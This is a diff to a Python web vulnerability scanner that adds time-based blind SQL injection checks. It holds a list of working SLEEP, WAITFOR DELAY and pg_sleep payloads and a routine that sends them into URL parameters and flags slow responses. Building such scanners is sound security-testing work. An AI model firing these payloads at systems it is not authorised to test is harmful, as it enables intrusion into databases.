@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import time
 from typing import Any
 from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 
@@ -83,6 +84,17 @@ CMDI_SUCCESS_INDICATORS = [
     "icmp_seq", "ttl=",
 ]
 
+# Time-based blind SQLi payloads (3-second delay)
+BLIND_SQLI_PAYLOADS = [
+    ("1' AND SLEEP(3)--", "MySQL"),
+    ("1'; WAITFOR DELAY '0:0:3'--", "MSSQL"),
+    ("1' AND pg_sleep(3)--", "PostgreSQL"),
+    ("1' OR SLEEP(3)#", "MySQL alt"),
+    ("1; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END--", "PostgreSQL cond"),
+]
+
+BLIND_SQLI_THRESHOLD = 2.5  # seconds — if response takes > this, likely sleeping
+
 
 @register_scanner
 class InjectionScanner(BaseScanner):
@@ -150,6 +162,7 @@ class InjectionScanner(BaseScanner):
             if query_params:
                 await self._test_params_sqli(http_client, target_url, query_params)
                 await self._test_params_xss(http_client, target_url, query_params)
+                await self._test_params_blind_sqli(http_client, target_url, query_params)
 
             # Test parameters from crawled URLs
             if target_info and target_info.crawled_urls:
@@ -158,6 +171,7 @@ class InjectionScanner(BaseScanner):
                     if crawled_params:
                         await self._test_params_sqli(http_client, crawled_url, crawled_params)
                         await self._test_params_xss(http_client, crawled_url, crawled_params)
+                        await self._test_params_blind_sqli(http_client, crawled_url, crawled_params)
 
         finally:
             if "http_client" not in kwargs:
@@ -429,5 +443,79 @@ class InjectionScanner(BaseScanner):
                         ))
                         return
 
+                except httpx.RequestError:
+                    pass
+
+    async def _test_params_blind_sqli(
+        self, client: httpx.AsyncClient, url: str, params: dict[str, str]
+    ) -> None:
+        """Test URL parameters for time-based blind SQL injection."""
+        parsed = urlparse(url)
+        base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+        for param_name in params:
+            # First, get baseline response time
+            test_params = params.copy()
+            test_params[param_name] = "1"
+            try:
+                start = time.monotonic()
+                await client.get(base, params=test_params)
+                baseline_time = time.monotonic() - start
+            except httpx.RequestError:
+                continue
+
+            for payload, db_type in BLIND_SQLI_PAYLOADS[:3]:
+                test_params = params.copy()
+                test_params[param_name] = payload
+                try:
+                    start = time.monotonic()
+                    await client.get(base, params=test_params, timeout=httpx.Timeout(10.0))
+                    elapsed = time.monotonic() - start
+
+                    if elapsed > BLIND_SQLI_THRESHOLD and elapsed > baseline_time + 2.0:
+                        self.add_vulnerability(Vulnerability(
+                            title=f"Blind SQL Injection — Time-based ({param_name})",
+                            description=(
+                                f"The parameter '{param_name}' at {url} appears vulnerable "
+                                f"to time-based blind SQL injection ({db_type}). "
+                                f"Response delayed by {elapsed - baseline_time:.1f}s."
+                            ),
+                            severity=Severity.CRITICAL,
+                            cvss_score=9.8,
+                            owasp_category=OWASPCategory.A03_INJECTION,
+                            url=url,
+                            parameter=param_name,
+                            evidence=(
+                                f"Payload: {payload} | "
+                                f"Baseline: {baseline_time:.2f}s | "
+                                f"With payload: {elapsed:.2f}s"
+                            ),
+                            remediation=(
+                                "Use parameterized queries (prepared statements). "
+                                "Never concatenate user input into SQL queries."
+                            ),
+                            cwe_id="CWE-89",
+                        ))
+                        return
+
+                except httpx.ReadTimeout:
+                    self.add_vulnerability(Vulnerability(
+                        title=f"Blind SQL Injection — Time-based ({param_name})",
+                        description=(
+                            f"The parameter '{param_name}' at {url} caused a request "
+                            f"timeout with a time-based SQLi payload ({db_type})."
+                        ),
+                        severity=Severity.CRITICAL,
+                        cvss_score=9.8,
+                        owasp_category=OWASPCategory.A03_INJECTION,
+                        url=url,
+                        parameter=param_name,
+                        evidence=f"Payload: {payload} | Response: TIMEOUT",
+                        remediation=(
+                            "Use parameterized queries. Implement input validation."
+                        ),
+                        cwe_id="CWE-89",
+                    ))
+                    return
                 except httpx.RequestError:
                     pass
